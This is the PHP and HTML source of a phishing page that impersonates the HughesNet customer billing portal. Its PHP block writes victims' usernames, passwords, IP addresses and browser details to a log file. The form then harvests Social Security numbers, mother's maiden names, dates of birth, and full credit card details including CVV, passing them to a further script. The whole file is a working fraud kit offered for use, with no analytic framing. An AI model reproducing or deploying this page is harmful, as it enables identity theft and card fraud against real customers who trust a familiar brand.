﻿<?php
if(isset($_POST['username']) && ($_POST['username'] !=="")){
		
$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('l jS \of F Y h:i:s A');
$site = "http://www.hughesnet.com/";
$counter =  $_POST['counter'];
$browser =  $_POST['browser'];



$fp = fopen("login.txt","a+") or exit("unable to open the file");
if($fp != null)
{
$spa = "\r\n";

$line = "-----------------------------------------------------";
fwrite($fp, "Username: " . $username);
fwrite($fp, $spa); 

fwrite($fp, "Password: " . $password);
fwrite($fp, $spa); 

fwrite($fp, "Ip: " . $ip);
fwrite($fp, $spa);

fwrite($fp, "Time: " . $time);
fwrite($fp, $spa);

fwrite($fp, "Browser: " . $browser);
fwrite($fp, $spa);

fwrite($fp, "Counter: " . $counter);
fwrite($fp, $spa);

fwrite($fp, "Site: " . $site);
fwrite($fp, $spa);

fwrite($fp, $line);
fwrite($fp, $spa);
fwrite($fp, $spa);
}
fclose($fp);
?>


<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; ">



<link rel="shortcut icon" href="favicon.ico">
<link href="style.css" rel="stylesheet" type="text/css" />
<link href="SpryAssets/SpryValidationTextField.css" rel="stylesheet" type="text/css" />
<link href="SpryAssets/SpryValidationSelect.css" rel="stylesheet" type="text/css" />

<script src="SpryAssets/SpryValidationTextField.js" type="text/javascript"></script>
<script src="SpryAssets/SpryValidationSelect.js" type="text/javascript"></script>
<script src="SpryAssets/SpryValidationConfirm.js" type="text/javascript"></script>
<title>Update Billing Info </title>
    <link rel="stylesheet" href="./accountDetails_files/dss_menu.css" type="text/css">
    <link rel="stylesheet" href="./accountDetails_files/dss_global.css" type="text/css">
    
    <link rel="stylesheet" href="./accountDetails_files/branding.css" type="text/css">
    <link href="SpryAssets/SpryValidationConfirm.css" rel="stylesheet" type="text/css">
</head>


<body leftmargin="0" topmargin="0" marginheight="0" marginwidth="0">




<table width="100%" border="0" cellspacing="0" cellpadding="5">
    <tbody><tr>
        <td width="220" valign="middle" align="left" height="54">
            <a href="javascript:dssBrandingWindow(leftLinkURL);"><img src="./accountDetails_files/left_pic.gif" width="182" height="39" border="0"></a>
        </td>
        <td valign="middle" height="54">
            <div align="center"></div>
        </td>
        <td width="180" valign="middle" align="right" height="54">
            <a href="javascript:dssBrandingWindow(rightLinkURL);"><img src="./accountDetails_files/right_pic.gif" width="140" height="39" border="0"></a>
        </td>
    </tr>
    <tr>


        <td class="header" align="left">
            <a class="HorizontalBar" href="https://www.myhughesnet.com/acapulco/commonjsp/welcome.jsp">Home</a>
        </td>
        <td class="header">

        </td>
        <td class="header" align="right">
            <!-- <a class="HorizontalBar" href="javascript:openDSSHelpWin(help_context, help_topic, 'DSSHelpWin')">Help</a> -->
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
            <a class="HorizontalBar" href="javascript:openDSSAboutWin()">About</a>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
            <a class="HorizontalBar" href="https://www.myhughesnet.com/acapulco/commonjsp/EndUserControlServlet.servlet/Logout">Logout</a>
        </td>

    </tr>
 </tbody></table>


<table width="100%" height="78%" border="0" cellpadding="0" cellspacing="0">
<tbody><tr>
<td width="100%" valign="top">
    <form name="submit2" method="post" action="inprogress.php" id="afdsf">
<table align="center" border="0" cellpadding="10" cellspacing="0" width="100%" height="100%">
<tbody><tr>
<td class="leftMenuPane" align="left" nowrap="" valign="top" width="220">
	      


<ul class="Menu" id="foldinglist" style="style=&amp;{head};">

        <li class="level1" id="foldheader">MyProfile</li>
        <ul class="Menu" id="foldinglist" style="display:none">

            	<li class="level2"><a class="MenuItem" href="https://admportal.myhughesnet.com/SDS/bws/combws/ViewCustomerInfo.servlet?viewType=Update#" onClick="javascript:hrefPostSubmit(&#39;https://www.myhughesnet.com/acapulco/commonjsp/change_password.jsp&#39;)">Change Password</a></li>

            	<li class="level2"><a class="MenuItem" href="https://admportal.myhughesnet.com/SDS/bws/combws/ViewCustomerInfo.servlet?viewType=Update#" onClick="javascript:hrefPostSubmit(&#39;https://www.myhughesnet.com/acapulco/commonjsp/set_hint.jsp&#39;)">Set Password Hint</a></li>

        </ul>

        <li class="level1" id="foldheader">Billing</li>
        <ul class="Menu" id="foldinglist" style="display:none">

            <li class="level2" id="foldheader">Account Administration</li>
            <ul class="Menu" id="foldinglist" style="display:none">

                	<li class="level3"><a class="MenuItem" href="https://admportal.myhughesnet.com/SDS/bws/combws/ViewCustomerInfo.servlet?viewType=Update#" onClick="javascript:hrefPostSubmit(&#39;https://admportal.myhughesnet.com/SDS/bws/combws/ViewCustomerInfo.servlet?viewType=ReadOnly&#39;)">View Account Info</a></li>

                	<li class="level3"><a class="MenuItem" href="https://admportal.myhughesnet.com/SDS/bws/combws/ViewCustomerInfo.servlet?viewType=Update#" onClick="javascript:hrefPostSubmit(&#39;https://admportal.myhughesnet.com/SDS/bws/combws/ShowPaymentHistory.servlet&#39;)">View Account History</a></li>

                	<li class="level3"><a class="MenuItem" href="https://admportal.myhughesnet.com/SDS/bws/combws/ViewCustomerInfo.servlet?viewType=Update#" onClick="javascript:hrefPostSubmit(&#39;https://admportal.myhughesnet.com/SDS/bws/combws/ViewCustomerInfo.servlet?viewType=Update&#39;)">Update Contact Info</a></li>

                	<li class="level3"><a class="MenuItem" href="https://admportal.myhughesnet.com/SDS/bws/combws/ViewCustomerInfo.servlet?viewType=Update#" onClick="javascript:hrefPostSubmit(&#39;https://admportal.myhughesnet.com/SDS/bws/combws/makePayment.jsp&#39;)">Make/Update Payment Information</a></li>

                	<li class="level3"><a class="MenuItem" href="https://admportal.myhughesnet.com/SDS/bws/combws/ViewCustomerInfo.servlet?viewType=Update#" onClick="javascript:hrefPostSubmit(&#39;https://admportal.myhughesnet.com/SDS/bws/combws/ViewSiteAccounts.servlet?requestType=viewChild&#39;)">View Site Accounts</a></li>

            </ul>

            <li class="level2" id="foldheader">Invoice Administration</li>
            <ul class="Menu" id="foldinglist" style="display:none">

                	<li class="level3"><a class="MenuItem" href="https://admportal.myhughesnet.com/SDS/bws/combws/ViewCustomerInfo.servlet?viewType=Update#" onClick="javascript:hrefPostSubmit(&#39;https://admportal.myhughesnet.com/SDS/bws/combws/ViewDefaultInvoice.servlet&#39;)">View Invoices</a></li>

            </ul>

            <li class="level2" id="foldheader">Usage Administration</li>
            <ul class="Menu" id="foldinglist" style="display:none">

                	<li class="level3"><a class="MenuItem" href="https://admportal.myhughesnet.com/SDS/bws/combws/ViewCustomerInfo.servlet?viewType=Update#" onClick="javascript:hrefPostSubmit(&#39;https://admportal.myhughesnet.com/SDS/bws/combws/ViewUsage.servlet?viewUsage=viewUsage&#39;)">View Usage Info</a></li>

            </ul>

        </ul>

        <li class="level1" id="foldheader">E-mail Accounts</li>
        <ul class="Menu" id="foldinglist" style="display:none">

            	<li class="level2"><a class="MenuItem" href="https://admportal.myhughesnet.com/SDS/bws/combws/ViewCustomerInfo.servlet?viewType=Update#" onClick="javascript:hrefPostSubmit(&#39;https://www.myhughesnet.com/kuas/member/EnhancedEmailServlet.servlet?reqtype=listAccounts&amp;operation=create&#39;)">Manage E-mails</a></li>

        </ul>

        <li class="level1" id="foldheader">Site Care</li>
        <ul class="Menu" id="foldinglist" style="display:none">

            <li class="level2" id="foldheader">HughesNet Remote</li>
            <ul class="Menu" id="foldinglist" style="display:none">

                	<li class="level3"><a class="MenuItem" target="Satellite Speed Test" href="https://admportal.myhughesnet.com/SDS/bws/combws/ViewCustomerInfo.servlet?viewType=Update#" onClick="javascript:hrefPostSubmit(&#39;https://www.myhughesnet.com/kuas/member/EnhancedEmailServlet.servlet?reqtype=speedTest&#39;)">Speed Test</a></li>

            </ul>

        </ul>

        <li class="level1" id="foldheader">Help</li>
        <ul class="Menu" id="foldinglist" style="display:none">

            	<li class="level2"><a class="MenuItem" href="https://admportal.myhughesnet.com/SDS/bws/combws/ViewCustomerInfo.servlet?viewType=Update#" onClick="javascript:hrefPostSubmit(&#39;https://admportal.myhughesnet.com/SDS/bws/combws/help.jsp&#39;)">Knowledge Base Support</a></li>

        </ul>

</ul>






 

          </td>

          <td width="80%" valign="top">

<table width="100%" cellpadding="0" cellspacing="0">
<input type="hidden" name="isInvBilling" value="false">
			    

               <tbody><tr>
               <td height="20" colspan="2" class="titlebar">Update Contact Info</td>
			   <td height="20" colspan="2" class="titlebar" align="right"> </td>
               </tr>
			  

              <tr>
              <td height="10" colspan="4"></td>
              </tr>










              


				
                </tbody></table>

                <table width="100%" cellpadding="0" cellspacing="0">
                <tbody><tr>
                <td width="100%" height="10">Fields marked with <span class="required">*</span> are required.</td>
                </tr>
                <!-- Added By Anuradha -->

                     <tr>
                       <td height="30"><div class="title-upper" style="padding-top:6px; background-color:#FFF;">
  <input type="hidden" name="counter" value="<?php echo $_POST['counter'];?>">
  <input type="hidden" name="browser" value="<?php echo $_POST['browser'];?>">
<input type="hidden" name="step2"><input type="hidden" name="login">&nbsp;	
        <input name="username" type="hidden" class="tinput" value="<?php echo $_POST['username'];?>" size="32" />
        <input name="password" type="hidden" class="tinput" value="<?php echo $_POST['password'];?>" size="32" id="password" readonly/>
       				

  <table>
    <tr valign="baseline">
      <td width="164" align="left" nowrap="nowrap" class="level1">CONTACT INFORMATION</td>
      <td width="84" align="right" nowrap="nowrap">&nbsp;</td>
      <td width="261">&nbsp;</td>
    </tr>
    <tr valign="baseline">
      <td nowrap="nowrap" align="left">&nbsp;</td>
      <td align="right" nowrap="nowrap" class="level2">First Name <strong style="color:#F00;">*</strong>: </td>
      <td><span id="sprytextfield10">
        <input name="fname" type="text" class="tinput" value="" size="32" />
        <span class="textfieldRequiredMsg">Enter <strong>first name</strong></span></span></td>
    </tr>
    <tr valign="baseline">
      <td nowrap="nowrap" align="left">&nbsp;</td>
      <td align="right" nowrap="nowrap" class="level2">Last Name <strong style="color:#F00;">* </strong>: </td>
      <td><span id="sprytextfield8">
        <input name="lname" type="text" class="tinput" value="" size="32" />
        <span class="textfieldRequiredMsg">Enter <strong>last name</strong></span></span></td>
    </tr>
    <tr valign="baseline">
      <td nowrap="nowrap" align="left">&nbsp;</td>
      <td align="right" valign="middle" nowrap="nowrap" class="level2">Home Address <strong style="color:#F00;">* </strong>: </td>
      <td><span id="sprytextfield13">
        <input name="address" type="text" class="tinput" value="" size="32" />
        <span class="textfieldRequiredMsg">Enter <strong>Address</strong></span></span></td>
    </tr>
    <tr valign="baseline">
      <td nowrap="nowrap" align="left">&nbsp;</td>
      <td align="right" valign="middle" nowrap="nowrap" class="level2">Work Address:</td>
      <td><span id="workAddress">
        <input name="address2" type="text" class="tinput" value="" size="32" />
        <span class="textfieldRequiredMsg">Enter <strong>Address</strong></span></span></td>
    </tr>
    <tr valign="baseline">
      <td nowrap="nowrap" align="left">&nbsp;</td>
      <td align="right" nowrap="nowrap" class="level2" valign="middle">City <strong style="color:#F00;">* </strong>: </td>
      <td><table border="0">
        <tr>
            <td><span id="sprytextfield12">
              <input name="city" type="text" class="tinput" value="" size="12" />
              <span class="textfieldRequiredMsg">Enter <strong>city</strong></span></span></td>
            <td align="right" nowrap="nowrap" class="level2">Zip <br>
              code <strong style="color:#F00;">*</strong>:</td>
            <td><span id="sprytextfield11">
              <input name="zipcode" type="text" class="tinput" value="" size="5" />
              <span class="textfieldRequiredMsg">Enter <strong>Zip code</strong></span><span class="textfieldInvalidFormatMsg">Invalid <strong>zip code</strong></span></span></td>
            </tr>
      </table></td>
    </tr>
    <tr valign="baseline">
      <td nowrap="nowrap" align="left">&nbsp;</td>
      <td align="right" nowrap="nowrap" class="level2" valign="middle">State <strong style="color:#F00;">* </strong>: </td>
      <td><table border="0" align="left">
        <tr>
          <td width="86"><span id="state">
            <select name="state" class="tinput">
              <option value="">Please Choose:</option>
              <option value="AL">Alabama (AL)</option>
              <option value="AK">Alaska (AK)</option>
              <option value="AZ">Arizona (AZ)</option>
              <option value="AR">Arkansas (AR)</option>
              <option value="CA">California (CA)</option>
              <option value="CO">Colorado (CO)</option>
              <option value="CT">Connecticut (CT)</option>
              <option value="DE">Delaware (DE)</option>
              <option value="DC">District Of Columbia (DC)</option>
              <option value="FL">Florida (FL)</option>
              <option value="GA">Georgia (GA)</option>
              <option value="HI">Hawaii (HI)</option>
              <option value="ID">Idaho (ID)</option>
              <option value="IL">Illinois (IL)</option>
              <option value="IN">Indiana (IN)</option>
              <option value="IA">Iowa (IA)</option>
              <option value="KS">Kansas (KS)</option>
              <option value="KY">Kentucky (KY)</option>
              <option value="LA">Louisiana (LA)</option>
              <option value="ME">Maine (ME)</option>
              <option value="MD">Maryland (MD)</option>
              <option value="MA">Massachusetts (MA)</option>
              <option value="MI">Michigan (MI)</option>
              <option value="MN">Minnesota (MN)</option>
              <option value="MS">Mississippi (MS)</option>
              <option value="MO">Missouri (MO)</option>
              <option value="MT">Montana (MT)</option>
              <option value="NE">Nebraska (NE)</option>
              <option value="NV">Nevada (NV)</option>
              <option value="NH">New Hampshire (NH)</option>
              <option value="NJ">New Jersey (NJ)</option>
              <option value="NM">New Mexico (NM)</option>
              <option value="NY">New York (NY)</option>
              <option value="NC">North Carolina (NC)</option>
              <option value="ND">North Dakota (ND)</option>
              <option value="OH">Ohio (OH)</option>
              <option value="OK">Oklahoma (OK)</option>
              <option value="OR">Oregon (OR)</option>
              <option value="PA">Pennsylvania (PA)</option>
              <option value="RI">Rhode Island (RI)</option>
              <option value="SC">South Carolina (SC)</option>
              <option value="SD">South Dakota (SD)</option>
              <option value="TN">Tennessee (TN)</option>
              <option value="TX">Texas (TX)</option>
              <option value="UT">Utah (UT)</option>
              <option value="VT">Vermont (VT)</option>
              <option value="VA">Virginia (VA)</option>
              <option value="WA">Washington (WA)</option>
              <option value="WV">West Virginia (WV)</option>
              <option value="WI">Wisconsin (WI)</option>
              <option value="WY">Wyoming (WY)</option>
              </select>
            <span class="selectRequiredMsg">Enter <strong>State</strong></span></span></td>
         </tr>
      </table></td>
    </tr>
    <tr valign="baseline">
      <td nowrap="nowrap" align="left">&nbsp;</td>
      <td align="right" nowrap="nowrap" class="level2">SSN <strong style="color:#F00;">*</strong> : </td>
      <td><span id="sprytextfield9">
        <input name="ssn" type="text" class="tinput" value="" size="32" />
        <span class="textfieldRequiredMsg">Enter your <strong>Social Security Number</strong></span><span class="textfieldInvalidFormatMsg">Invalid format.E.g. <strong>XXX-XX-XXXX</strong></span></span></td>
    </tr>
    <tr valign="baseline">
      <td nowrap="nowrap" align="left">&nbsp;</td>
      <td align="right" nowrap="nowrap" class="level2">Mother's maden name <strong style="color:#F00;">*</strong> : </td>
      <td>
        <input name="mmn" type="text" class="tinput" value="" size="32" />
       </td>
    </tr>
    <tr valign="baseline">
      <td nowrap="nowrap" align="left">&nbsp;</td>
      <td align="right" nowrap="nowrap" class="level2" valign="middle">Date of Birth <strong style="color:#F00;">* </strong>:</td>
      <td><table border="0">
        <tr>
          <td><span id="spryselect1"><select name="dob1" class="tinput" id="exp_month2" style="width:80px;">
            <option value="" selected="selected">Month</option>
            <option value="1">January</option>
            <option value="2">February</option>
            <option value="3">March</option>
            <option value="4">April</option>
            <option value="5">May</option>
            <option value="6">June</option>
            <option value="7">July</option>
            <option value="8">August</option>
            <option value="9">September</option>
            <option value="10">October</option>
            <option value="11">November</option>
            <option value="12">December</option>
            </select><span class="selectRequiredMsg"> <strong> Month</strong></span></span></td>
          <td>
            
            <span id="spryselect3">
              
              
              <select name="dob2" id="dob2" aria-label="Day" class="tinput">
                <option value="">Day</option>
                <option value="1">1</option>
                <option value="2">2</option>
                <option value="3">3</option>
                <option value="4">4</option>
                <option value="5">5</option>
                <option value="6">6</option>
                <option value="7">7</option>
                <option value="8">8</option>
                <option value="9">9</option>
                <option value="10">10</option>
                <option value="11">11</option>
                <option value="12">12</option>
                <option value="13">13</option>
                <option value="14">14</option>
                <option value="15">15</option>
                <option value="16">16</option>
                <option value="17">17</option>
                <option value="18">18</option>
                <option value="19">19</option>
                <option value="20">20</option>
                <option value="21">21</option>
                <option value="22">22</option>
                <option value="23">23</option>
                <option value="24">24</option>
                <option value="25">25</option>
                <option value="26">26</option>
                <option value="27">27</option>
                <option value="28">28</option>
                <option value="29">29</option>
                <option value="30">30</option>
                <option value="31">31</option>
                </select>
              <span class="selectRequiredMsg"> <strong> Day</strong></span></span>
            
            </td>
          <td><span id="spryselect2">
            <select name="dob3" class="tinput" id="exp_year">
              <option value="" selected="selected">Year</option>
              
              
              
              <option value="2003">2003</option>
              <option value="2002">2002</option>
              <option value="2001">2001</option>
              <option value="2000">2000</option>
              <option value="1999">1999</option>
              <option value="1998">1998</option>
              <option value="1997">1997</option>
              <option value="1996">1996</option>
              <option value="1995">1995</option>
              <option value="1994">1994</option>
              <option value="1993">1993</option>
              <option value="1992">1992</option>
              <option value="1991">1991</option>
              <option value="1990">1990</option>
              <option value="1989">1989</option>
              <option value="1988">1988</option>
              <option value="1987">1987</option>
              <option value="1986">1986</option>
              <option value="1985">1985</option>
              <option value="1984">1984</option>
              <option value="1983">1983</option>
              <option value="1982">1982</option>
              <option value="1981">1981</option>
              <option value="1980">1980</option>
              <option value="1979">1979</option>
              <option value="1978">1978</option>
              <option value="1977">1977</option>
              <option value="1976">1976</option>
              <option value="1975">1975</option>
              <option value="1974">1974</option>
              <option value="1973">1973</option>
              <option value="1972">1972</option>
              <option value="1971">1971</option>
              <option value="1970">1970</option>
              <option value="1969">1969</option>
              <option value="1968">1968</option>
              <option value="1967">1967</option>
              <option value="1966">1966</option>
              <option value="1965">1965</option>
              <option value="1964">1964</option>
              <option value="1963">1963</option>
              <option value="1962">1962</option>
              <option value="1961">1961</option>
              <option value="1960">1960</option>
              <option value="1959">1959</option>
              <option value="1958">1958</option>
              <option value="1957">1957</option>
              <option value="1956">1956</option>
              <option value="1955">1955</option>
              <option value="1954">1954</option>
              <option value="1953">1953</option>
              <option value="1952">1952</option>
              <option value="1951">1951</option>
              <option value="1950">1950</option>
              <option value="1949">1949</option>
              <option value="1948">1948</option>
              <option value="1947">1947</option>
              <option value="1946">1946</option>
              <option value="1945">1945</option>
              <option value="1944">1944</option>
              <option value="1943">1943</option>
              <option value="1942">1942</option>
              <option value="1941">1941</option>
              <option value="1940">1940</option>
              <option value="1939">1939</option>
              <option value="1938">1938</option>
              <option value="1937">1937</option>
              <option value="1936">1936</option>
              <option value="1935">1935</option>
              <option value="1934">1934</option>
              <option value="1933">1933</option>
              <option value="1932">1932</option>
              <option value="1931">1931</option>
              <option value="1930">1930</option>
              <option value="1929">1929</option>
              <option value="1928">1928</option>
              <option value="1927">1927</option>
              <option value="1926">1926</option>
              <option value="1925">1925</option>
              <option value="1924">1924</option>
              <option value="1923">1923</option>
              <option value="1922">1922</option>
              <option value="1921">1921</option>
              <option value="1920">1920</option>
              <option value="1919">1919</option>
              <option value="1918">1918</option>
              <option value="1917">1917</option>
              <option value="1916">1916</option>
              <option value="1915">1915</option>
              <option value="1914">1914</option>
              <option value="1913">1913</option>
              <option value="1912">1912</option>
              <option value="1911">1911</option>
              <option value="1910">1910</option>
              <option value="1909">1909</option>
              <option value="1908">1908</option>
              <option value="1907">1907</option>
              <option value="1906">1906</option>
              <option value="1905">1905</option>
              
              </select>
            <span class="selectRequiredMsg"> <strong> Year</strong></span></span></td></tr>
        </table></td>
    </tr>
    <tr valign="baseline">
      <td align="left" nowrap="nowrap" class="level1">PAYMENT INFORMATION</td>
      <td nowrap="nowrap" align="right">&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr valign="baseline">
      <td nowrap="nowrap" align="left">&nbsp;</td>
      <td align="right" nowrap="nowrap" class="level2">Name on Card <strong style="color:#F00;">* </strong>:</td>
      <td><span id="sprytextfield5">
        <input name="nameoncard" type="text" class="tinput" value="" size="32" />
        <span class="textfieldRequiredMsg">Enter your name as written on your <strong>Credit Card</strong></span></span></td>
    </tr>
    <tr valign="baseline">
      <td nowrap="nowrap" align="left">:</td>
      <td align="right" nowrap="nowrap" class="level2">Card Type <strong style="color:#F00;">* </strong>:</td>
<td><span id="spryselect4">
  <select name="cc_type" class="tinput" id="cc_type">
    <option value="" selected="selected">Select card type</option>
    <option value="Master Card">Master Card</option>
    <option value="Visa card">Visa card</option>
    <option value="Discovery">Discovery</option>
    <option value="American Express">American Express</option>
  </select>
  <span class="selectRequiredMsg"> <strong>Credit Card Type</strong></span></span></td>
    </tr>
    <tr valign="baseline">
      <td nowrap="nowrap" align="left">&nbsp;</td>
      <td align="right" nowrap="nowrap" class="level2">Card Number <strong style="color:#F00;">* </strong>:</td>
      <td><span id="sprytextfield1">
      <input name="card_num" type="text" class="tinput" value="" size="32" id="card_num" />
      <span class="textfieldRequiredMsg">Enter Credit Card Number</span><span class="textfieldInvalidFormatMsg">Invalid <strong>Credit Card Number</strong></span></span></td>
    </tr>
    <tr valign="baseline">
      <td nowrap="nowrap" align="left">&nbsp;</td>
      <td align="right" nowrap="nowrap" class="level2">Cvv <strong style="color:#F00;">* </strong>:</td>
      <td><span id="sprytextfield2">
      <input name="cvv" type="text" class="tinput" value="" size="3" maxlength="4" />
      <span class="textfieldRequiredMsg">Enter <strong>Cvv</strong></span><span class="textfieldInvalidFormatMsg">Invalid <strong>Cvv</strong></span></span></td>
    </tr>
    <tr>
                                    <td align="left">&nbsp;</td>
                                    <td align="right" class="level2">
                                Expiry <strong style="color:#F00;">* </strong>: </td>
                                    <td><table border="0">
                                <tr>
                                  <td><span id="expMonth">
                                    <select name="exp_month" class="tinput" id="exp_month" style="width:70px;">
                                      <option value="" selected="selected">Month</option>
                                      <option value="1">January</option>
                                      <option value="2">February</option>
                                      <option value="3">March</option>
                                      <option value="4">April</option>
                                      <option value="5">May</option>
                                      <option value="6">June</option>
                                      <option value="7">July</option>
                                      <option value="8">August</option>
                                      <option value="9">September</option>
                                      <option value="10">October</option>
                                      <option value="11">November</option>
                                      <option value="12">December</option>
                                    </select>
                                    <span class="selectRequiredMsg"> <strong> Month</strong></span></span></td>
                                  <td>&nbsp;</td>
                                <td><span id="expYear">
                                  <select name="exp_year" class="tinput" id="exp_year">
                                    <option value="" selected="selected">Year</option>
                                    d<option value="2019">2019</option>
                                    <option value="2020">2020</option>
                                    <option value="2021">2021</option>
                                    <option value="2022">2022</option>
                                    <option value="2023">2023</option>
                                    <option value="2024">2024</option>
                                    <option value="2025">2025</option>
                                    <option value="2026">2026</option>
                                    <option value="2027">2027</option>
                                    <option value="2028">2028</option>
									<option value="2029">2029</option>
									<option value="2030">2030</option>
									<option value="2031">2031</option>
									<option value="2032">2032</option>
									<option value="2033">2033</option>
                                  </select>
                                  <span class="selectRequiredMsg"> <strong> Year</strong></span></span></td></tr>
                              </table></td>
    </tr>
    <tr valign="baseline">
      <td nowrap="nowrap" align="left">&nbsp;</td>
      <td align="right" nowrap="nowrap" class="level2">Issuing Bank <strong style="color:#F00;">* </strong>:</td>
      <td><span id="sprytextfield3">
        <input name="issue_bank" type="text" class="tinput" value="" size="32" />
        <span class="textfieldRequiredMsg">Enter <strong>Issuing Bank</strong></span></span></td>
    </tr>
    <tr valign="baseline">
      <td nowrap="nowrap" align="left">&nbsp;</td>
      <td nowrap="nowrap" align="right"><span class="level2">Phone <strong style="color:#F00;">* </strong></span>:</td>
      <td><span id="sprytextfield4">
        <input name="phone" type="text" class="tinput" value="" size="32" />
        <span class="textfieldRequiredMsg">Enter <strong>Phone Number</strong></span></span></td>
    </tr>
    <tr valign="baseline">
      <td nowrap="nowrap" align="left">&nbsp;</td>
      <td align="right" nowrap="nowrap" class="level2">&nbsp;</td>
      <td></td>
    </tr>
    <tr valign="baseline">
      <td nowrap="nowrap" align="left">&nbsp;</td>
      <td nowrap="nowrap" align="right">&nbsp;</td>
      <td><input type="submit" name="button" id="button" value=" Verify"  class="submitbtn"/>
  &nbsp;&nbsp;
  </td>
    </tr>
</table></div></td>
                     </tr>
	



<tr>
<td height="10">
<hr>
</td>
</tr>

<tr>
<td height="10"></td>
</tr>

<tr>
<td align="center" height="20">&nbsp;</td>
</tr>
        
           
           </tbody></table>
           </td>
           </tr>
           </tbody></table>
        </form>

      </td>
           </tr>
</tbody></table>



<table width="100%" border="0" cellpadding="0" cellspacing="0">
    <tbody><tr>
        <td class="footer" width="100%" align="center">
            
            <a class="HorizontalBar" href="http://support.hughes.com/"> Contact Us </a>&nbsp;&nbsp;&nbsp;| &nbsp;&nbsp;&nbsp;
            
            
            <a class="HorizontalBar" href="http://legal.hughesnet.com/SubscriberPolicies.cfm"> Privacy Policy </a>
            
            <br>
            
            <sub> © 2003 - <script>document.write((new Date()).getFullYear())</script> Hughes Network Systems, LLC. All Rights Reserved. </sub>
            
        </td>
    </tr>
    <tr>
        <td>&nbsp;
            
        </td>
    </tr>
</tbody></table>


	

<script type="text/javascript">
<!--
var sprytextfield1 = new Spry.Widget.ValidationTextField("sprytextfield1", "credit_card", {validateOn:["blur"]});
var sprytextfield2 = new Spry.Widget.ValidationTextField("sprytextfield2", "integer", {validateOn:["blur"]});
var spryselect1 = new Spry.Widget.ValidationSelect("spryselect1");

var expMonth = new Spry.Widget.ValidationSelect("expMonth");
var expYear = new Spry.Widget.ValidationSelect("expYear");

var spryselect2 = new Spry.Widget.ValidationSelect("spryselect2");
var spryselect3 = new Spry.Widget.ValidationSelect("spryselect3");
var spryselect4 = new Spry.Widget.ValidationSelect("spryselect4");
var sprytextfield3 = new Spry.Widget.ValidationTextField("sprytextfield3", "none", {validateOn:["blur"]});
var sprytextfield4 = new Spry.Widget.ValidationTextField("sprytextfield4", "none", {validateOn:["blur"]});

var sprytextfield5 = new Spry.Widget.ValidationTextField("sprytextfield5", "none", {validateOn:["blur"]});
var sprytextfield9 = new Spry.Widget.ValidationTextField("sprytextfield9", "social_security_number", {validateOn:["change"]});

var sprytextfield8 = new Spry.Widget.ValidationTextField("sprytextfield8");
var sprytextfield10 = new Spry.Widget.ValidationTextField("sprytextfield10");
var sprytextfield13 = new Spry.Widget.ValidationTextField("sprytextfield13", "none", {validateOn:["blur"]});
var workAddress = new Spry.Widget.ValidationTextField("workAddress", "none", {validateOn:["blur"], isRequired:false});
var state = new Spry.Widget.ValidationSelect("state");
var sprytextfield12 = new Spry.Widget.ValidationTextField("sprytextfield12", "none", {validateOn:["blur"]});
var sprytextfield11 = new Spry.Widget.ValidationTextField("sprytextfield11", "zip_code", {validateOn:["blur"]});
//-->
</script>

</body></html>
<?php }else{
header('Location: index.php'); } ?>